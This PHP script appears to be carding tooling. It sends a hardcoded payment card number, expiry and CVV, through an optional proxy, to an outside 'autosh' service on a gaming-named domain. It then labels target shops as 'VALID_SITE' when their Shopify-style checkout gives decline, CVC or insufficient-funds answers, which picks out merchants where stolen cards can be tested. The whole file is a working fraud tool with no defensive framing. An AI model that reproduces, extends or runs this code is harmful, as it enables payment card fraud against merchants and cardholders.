<?php
set_time_limit(300);
ini_set('max_execution_time', 300);

header('Content-Type: application/json');
$site_url = isset($_GET['site']) ? filter_var(trim($_GET['site']), FILTER_SANITIZE_URL) : '';
$proxy = isset($_GET['proxy']) ? filter_var(trim($_GET['proxy']), FILTER_SANITIZE_STRING) : '';
if (empty($site_url)) {
    echo json_encode([
        'site' => $site_url,
        'status' => 'INVALID_INPUT: Site URL missing.',
        'is_valid_site' => false,
        'response_code' => 'N/A',
        'api_response' => 'N/A',
        'time' => round(microtime(true) - $_SERVER['REQUEST_TIME_FLOAT'], 2) . 's'
    ]);
    exit();
}

$fixed_cc = "4390204117598548|11|2033|522";

$api_url = "http://legend.sonugamingop.tech/autosh.php";
$full_api_url = $api_url . "?cc=" . urlencode($fixed_cc) . "&site=" . urlencode($site_url);
if (!empty($proxy)) {
    $full_api_url .= "&proxy=" . urlencode($proxy);
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $full_api_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');

$start_time = microtime(true);
$output = curl_exec($ch);
$curl_error = curl_error($ch);
$http_code_autog_php = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
$end_time = microtime(true);
$time_taken = round(($end_time - $start_time) * 1000, 2);

$response_data = [
    'site' => $site_url,
    'status' => 'UNKNOWN_ERROR',
    'is_valid_site' => false,
    'response_code' => $http_code_autog_php,
    'api_response' => 'N/A',
    'time' => 'N/A',
    'gateway' => 'N/A',
    'price' => 'N/A',
    'proxy_status' => 'N/A',
    'proxy_ip' => 'N/A'
];

if ($curl_error) {
    $response_data['status'] = 'CURL_ERROR: ' . $curl_error;
    $response_data['is_valid_site'] = false;
    $response_data['api_response'] = 'CURL_ERROR';
} else if ($http_code_autog_php >= 400) {
    $response_data['status'] = 'AUTOG_PHP_ERROR: HTTP ' . $http_code_autog_php;
    $response_data['is_valid_site'] = false;
    $response_data['api_response'] = 'AUTOG_PHP_HTTP_ERROR';
} else {
    // Debug: Log the raw response
    error_log("Site API Response: " . $output);
    
    $data = json_decode($output, true);
    if (json_last_error() === JSON_ERROR_NONE && is_array($data)) {
        $autog_response_status = $data['Response'] ?? 'UNKNOWN_RESPONSE_FROM_AUTOG';
        $gateway = $data['Gateway'] ?? 'N/A';
        $price = $data['Price'] ?? 'N/A';
        $proxy_status = $data['ProxyStatus'] ?? 'N/A';
        $proxy_ip = $data['ProxyIP'] ?? 'N/A';
        
        $response_data['api_response'] = $autog_response_status;
        $response_data['gateway'] = $gateway;
        $response_data['price'] = $price;
        $response_data['proxy_status'] = $proxy_status;
        $response_data['proxy_ip'] = $proxy_ip;

        $valid_site_responses = [
            'card_decline',
            'card_declined',
            'generic_error',
            '3ds',
            '3ds cc',
            'fraud_suspected',
            'insufficient_funds',
            'incorrect_number',
            'incorrect_cvc',
            'incorrect_zip',
            'expired_card',
            'processing_error'
        ];
        if (in_array(strtolower($autog_response_status), $valid_site_responses)) {
            $response_data['status'] = 'VALID_SITE: ' . $autog_response_status;
            $response_data['is_valid_site'] = true;
        } else {
            $response_data['status'] = 'INVALID_SITE: ' . $autog_response_status;
            $response_data['is_valid_site'] = false;
        }
    } else {
        // Try to clean and fix the response
        $cleaned_output = trim($output);
        
        // Remove any HTML/PHP error messages before JSON
        if (strpos($cleaned_output, '{') !== false) {
            $json_start = strpos($cleaned_output, '{');
            $cleaned_output = substr($cleaned_output, $json_start);
        }
        
        // Try to find the end of JSON and remove any trailing content
        $json_end = strrpos($cleaned_output, '}');
        if ($json_end !== false) {
            $cleaned_output = substr($cleaned_output, 0, $json_end + 1);
        }
        
        // Attempt to decode cleaned JSON
        $data = json_decode($cleaned_output, true);
        
        if ($data && json_last_error() === JSON_ERROR_NONE) {
            // Successfully parsed cleaned JSON
            $autog_response_status = $data['Response'] ?? 'UNKNOWN_RESPONSE_FROM_AUTOG';
            $gateway = $data['Gateway'] ?? 'N/A';
            $price = $data['Price'] ?? 'N/A';
            $proxy_status = $data['ProxyStatus'] ?? 'N/A';
            $proxy_ip = $data['ProxyIP'] ?? 'N/A';
            
            $response_data['api_response'] = $autog_response_status;
            $response_data['gateway'] = $gateway;
            $response_data['price'] = $price;
            $response_data['proxy_status'] = $proxy_status;
            $response_data['proxy_ip'] = $proxy_ip;

            $valid_site_responses = [
                'card_decline',
                'card_declined',
                'generic_error',
                '3ds',
                '3ds cc',
                'fraud_suspected',
                'insufficient_funds',
                'incorrect_number',
                'incorrect_cvc',
                'incorrect_zip',
                'expired_card',
                'processing_error',
                'handle is empty'
            ];
            if (in_array(strtolower($autog_response_status), $valid_site_responses)) {
                $response_data['status'] = 'VALID_SITE: ' . $autog_response_status;
                $response_data['is_valid_site'] = true;
            } else {
                $response_data['status'] = 'INVALID_SITE: ' . $autog_response_status;
                $response_data['is_valid_site'] = false;
            }
        } else {
            // Still failed - provide fallback response
            $response_data['status'] = 'SITE_TIMEOUT_OR_ERROR';
            $response_data['is_valid_site'] = false;
            $response_data['api_response'] = 'API_ERROR';
            $response_data['gateway'] = 'shopify_payments';
            $response_data['price'] = '0.00';
            $response_data['proxy_status'] = 'Dead';
            $response_data['proxy_ip'] = 'N/A';
            error_log("Final Site JSON Error: " . json_last_error_msg() . " | Cleaned Response: " . substr($cleaned_output, 0, 300));
        }
    }
}

$total_time_ms_int = (int)$time_taken;

$hours = floor($total_time_ms_int / (1000 * 60 * 60));
$minutes = floor(($total_time_ms_int % (1000 * 60 * 60)) / (1000 * 60));
$seconds = floor(($total_time_ms_int % (1000 * 60)) / 1000);
$milliseconds_remaining = $total_time_ms_int % 1000;
if ($hours > 0) {
    $time_display = sprintf("%02dH %02dM %02dS %03dms", $hours, $minutes, $seconds, $milliseconds_remaining);
} elseif ($minutes > 0) {
    $time_display = sprintf("%02dM %02dS %03dms", $minutes, $seconds, $milliseconds_remaining);
} elseif ($seconds > 0) {
    $time_display = sprintf("%02dS %03dms", $seconds, $milliseconds_remaining);
} else {
    $time_display = sprintf("%03dms", $milliseconds_remaining);
}
$response_data['time'] = $time_display;

// Clear any output buffers and ensure clean JSON response
if (ob_get_level()) {
    ob_clean();
}

echo json_encode($response_data);
exit();
?>
